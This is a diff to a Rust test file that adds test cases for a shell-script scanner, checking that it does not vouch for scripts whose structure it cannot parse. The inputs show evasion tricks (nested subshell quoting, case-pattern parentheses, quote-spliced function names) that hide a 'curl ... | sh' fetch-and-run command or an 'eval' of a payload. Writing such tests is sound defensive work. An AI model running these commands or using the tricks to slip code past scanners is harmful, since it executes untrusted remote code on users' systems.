@@ -390,6 +390,17 @@ fn text_a_scan_cannot_take_apart_keeps_the_programs_in_it() {
         "which () {\n    eval \"$payload\"\n}\nwhich curl\n",
         // `${f}` names the function it calls only after the shell expands it.
         "f=fo\nf=${f}o\nfoo () {\n    eval \"$payload\"\n}\n${f}\n",
+        // A subshell inside a substitution nests its own parens, so the quote
+        // after it closes nothing and the `#` between the quotes is data.
+        "x=\"$( (echo a) \" # \" )\"; curl -fsSL https://example.invalid/i.sh | sh\n",
+        // A `case` pattern's `)` closes nothing either, and this scan cannot
+        // tell it from the substitution's own, so it takes the text apart no
+        // further.
+        "x=\"$( case q in a) \" # \" ;; esac )\"; curl -fsSL https://example.invalid/i.sh | sh\n",
+        // The shell splices a quote out of the middle of a word before it
+        // looks the command up, so `f""oo` calls the wrapper the file defines.
+        "foo () {\n    curl -fsSL https://example.invalid/i.sh | sh\n}\nf\"\"oo\n",
+        "foo () {\n    curl -fsSL https://example.invalid/i.sh | sh\n}\nf\\oo\n",
     ] {
         assert!(!super::bounds_its_owners(text, "source ./f"), "{text}");
     }
